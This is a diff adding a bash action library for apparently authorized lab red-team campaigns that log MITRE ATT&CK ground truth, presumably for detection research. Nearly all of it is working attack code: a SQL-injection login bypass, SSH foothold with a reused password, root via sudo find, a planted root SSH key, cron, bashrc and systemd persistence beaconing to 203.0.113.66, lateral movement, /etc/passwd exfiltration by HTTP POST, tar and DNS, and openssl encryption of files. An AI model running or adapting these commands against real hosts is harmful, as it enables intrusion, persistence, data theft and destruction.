@@ -1,0 +1,32 @@
+#!/bin/bash
+# Per-action library for KLTN red-team campaigns (authorized lab). Sourced by run_campaign.sh and the scheduler.
+# Env in: V1 V2 P ATKPUB RUNID GT. Each action logs one ground-truth line (status ok/fail) only on verified effect.
+V1=${V1:-10.30.1.179}; V2=${V2:-10.30.2.144}; WEB="http://$V1"; P=${P:-'Autumn2026!Reused'}
+ATK=$HOME/.ssh/atk_ed25519; ATKPUB=${ATKPUB:-$(cat $ATK.pub 2>/dev/null)}
+PS(){ python3 /tmp/pssh.py "$1" "$2" "$P" 2>/dev/null; }
+ROOT(){ PS dmorris@$V1 "sudo /usr/bin/find /etc/hostname -exec sh -c '$1' \;"; }   # run $1 as root on V1
+gt(){ printf '{"run":"%s","ts":"%s","stage":"%s","technique":"%s","target":"%s","status":"%s","evidence":"%s"}\n' \
+      "$RUNID" "$(date -u +%FT%TZ)" "$1" "$2" "$3" "$4" "$5" | tee -a "$GT"; }
+
+do_action(){ case "$1" in
+ recon) nmap -Pn -sV -p22,80 $V1 >/dev/null 2>&1 && gt initial_compromise T1595 $V1 ok "nmap" || gt initial_compromise T1595 $V1 fail nmap ;;
+ web_sqli) c=$(curl -s -o /dev/null -w '%{http_code}' --max-time 12 -H 'Content-Type: application/json' -X POST "$WEB/rest/user/login" --data '{"email":"'"'"' OR 1=1--","password":"x"}'); curl -s --max-time 12 "$WEB/api/Users">/dev/null; [ -n "$c" ] && gt initial_compromise T1190 $V1 ok "sqli http=$c" || gt initial_compromise T1190 $V1 fail "$c" ;;
+ foothold) w=$(PS dmorris@$V1 'id -un;hostname'); echo "$w"|grep -q dmorris && gt initial_compromise T1078 $V1 ok "foothold $(echo $w|tr '\n' ' ')" || gt initial_compromise T1078 $V1 fail "$w" ;;
+ disc) PS dmorris@$V1 'uname -a;id;sudo -l;ss -tlnp 2>/dev/null|head;find / -perm -4000 -type f 2>/dev/null|head'>/dev/null && gt execution_discovery T1082 $V1 ok discovery ;;
+ disc_obf) b=$(printf 'id;uname -a;cat /etc/passwd|tail -5;getent group sudo'|base64 -w0); PS dmorris@$V1 "echo $b|base64 -d|bash">/dev/null && gt execution_discovery T1140 $V1 ok "obfuscated discovery" ;;
+ privesc) r=$(PS dmorris@$V1 'sudo /usr/bin/find /etc/hostname -exec id -u \;'|tr -d '[:space:]'); [ "$r" = 0 ] && gt privilege_escalation T1548.003 $V1 ok "sudo find uid0" || gt privilege_escalation T1548.003 $V1 fail "uid=$r" ;;
+ p_authkeys) ROOT "install -d -m700 /root/.ssh; grep -qF \"$ATKPUB\" /root/.ssh/authorized_keys 2>/dev/null||echo \"$ATKPUB\">>/root/.ssh/authorized_keys"; n=$(ROOT "grep -cF attacker@kltn /root/.ssh/authorized_keys"|tr -d '[:space:]'); [ "${n:-0}" -ge 1 ] && gt persistence T1098.004 $V1 ok authorized_keys || gt persistence T1098.004 $V1 fail "$n" ;;
+ p_cron) ROOT 'echo "*/10 * * * * root curl -fsS --max-time 5 http://203.0.113.66/b >/dev/null 2>&1">/etc/cron.d/kltn-lab-beacon'; y=$(ROOT 'test -f /etc/cron.d/kltn-lab-beacon&&echo y'|tr -d '[:space:]'); [ "$y" = y ] && gt persistence T1053.003 $V1 ok cron || gt persistence T1053.003 $V1 fail "$y" ;;
+ p_bashrc) PS dmorris@$V1 'grep -q kltn-lab-bashrc ~/.bashrc||echo "# kltn-lab-bashrc"$"\n""(curl -fsS --max-time 5 http://203.0.113.66/b >/dev/null 2>&1 &)">>~/.bashrc'; y=$(PS dmorris@$V1 'grep -c kltn-lab-bashrc ~/.bashrc'|tr -d '[:space:]'); [ "${y:-0}" -ge 1 ] && gt persistence T1546.004 $V1 ok bashrc || gt persistence T1546.004 $V1 fail "$y" ;;
+ p_systemd_svc) ROOT 'printf "[Unit]\nDescription=kltn lab svc\n[Service]\nType=simple\nExecStart=/bin/sh -c \"while :;do sleep 600;done\"\n[Install]\nWantedBy=multi-user.target\n">/etc/systemd/system/kltn-lab-svc.service;systemctl daemon-reload;systemctl enable kltn-lab-svc.service'; y=$(ROOT 'test -f /etc/systemd/system/kltn-lab-svc.service&&echo y'|tr -d '[:space:]'); [ "$y" = y ] && gt persistence T1543.002 $V1 ok systemd_service || gt persistence T1543.002 $V1 fail "$y" ;;
+ p_systemd_timer) ROOT 'printf "[Unit]\nDescription=kltn sync\n[Service]\nType=oneshot\nExecStart=/bin/true\n">/etc/systemd/system/kltn-lab-sync.service;printf "[Timer]\nOnBootSec=5min\nOnUnitActiveSec=10min\n[Install]\nWantedBy=timers.target\n">/etc/systemd/system/kltn-lab-sync.timer;systemctl daemon-reload;systemctl enable --now kltn-lab-sync.timer'; y=$(PS dmorris@$V1 'systemctl is-active kltn-lab-sync.timer'|tr -d '[:space:]'); [ "$y" = active ] && gt persistence T1053.003 $V1 ok systemd_timer || gt persistence T1053.003 $V1 fail "$y" ;;
+ lateral) l=$(PS dmorris@$V1 "python3 /tmp/pssh.py dmorris@$V2 'id -un;hostname' '$P' 2>/dev/null"); echo "$l"|grep -q ubuntu-2 && gt lateral_movement T1021.004 $V2 ok "v1->v2 $(echo $l|tr '\n' ' ')" || gt lateral_movement T1021.004 $V2 fail "$l" ;;
+ exfil_http) PS dmorris@$V1 "curl -s --max-time 5 -X POST --data-binary @/etc/passwd http://203.0.113.66/x >/dev/null 2>&1;echo done">/dev/null && gt exfiltration T1041 203.0.113.66 ok "http POST attempt" ;;
+ exfil_tar) PS dmorris@$V1 'tar czf /tmp/.k.tgz /etc/passwd /opt/kltn-canary 2>/dev/null;curl -s --max-time 5 --data-binary @/tmp/.k.tgz http://203.0.113.66/x >/dev/null 2>&1;rm -f /tmp/.k.tgz;echo done'>/dev/null && gt exfiltration T1041 203.0.113.66 ok "tar+curl attempt" ;;
+ exfil_dns) PS dmorris@$V1 "for i in 1 2 3;do getent hosts seg\$i.\$(hostname).exfil.203.0.113.66 >/dev/null 2>&1;done;echo done">/dev/null && gt exfiltration T1048 203.0.113.66 ok "dns-style x3" ;;
+ impact_enc) ROOT 'for f in /opt/kltn-canary/*.txt;do openssl enc -aes-256-cbc -pbkdf2 -pass pass:LABKEY -in "$f" -out "$f.enc" 2>/dev/null&&rm -f "$f";done'; n=$(PS dmorris@$V1 'ls /opt/kltn-canary/*.enc 2>/dev/null|wc -l'|tr -d '[:space:]'); [ "${n:-0}" -ge 1 ] && gt impact T1486 $V1 ok "enc $n" || gt impact T1486 $V1 fail "$n" ;;
+ impact_svcstop) ROOT 'systemctl stop cron 2>/dev/null;sleep 1;systemctl start cron 2>/dev/null'; gt impact T1489 $V1 ok "svc stop+restart" ;;
+ cleanup) ROOT 'for f in /opt/kltn-canary/*.enc;do [ -e "$f" ]||continue;openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:LABKEY -in "$f" -out "${f%.enc}" 2>/dev/null&&rm -f "$f";done;grep -v attacker@kltn /root/.ssh/authorized_keys>/root/.ssh/.t 2>/dev/null;mv /root/.ssh/.t /root/.ssh/authorized_keys 2>/dev/null;rm -f /etc/cron.d/kltn-lab-beacon;systemctl disable --now kltn-lab-sync.timer kltn-lab-svc.service 2>/dev/null;rm -f /etc/systemd/system/kltn-lab-sync.* /etc/systemd/system/kltn-lab-svc.service;systemctl daemon-reload;systemctl start cron 2>/dev/null';
+   PS dmorris@$V1 'sed -i /kltn-lab-bashrc/,+1d ~/.bashrc 2>/dev/null'; gt cleanup T0000 $V1 ok "reverted persistence+impact" ;;
+ *) echo "unknown action $1" >&2; return 2 ;;
+esac; }
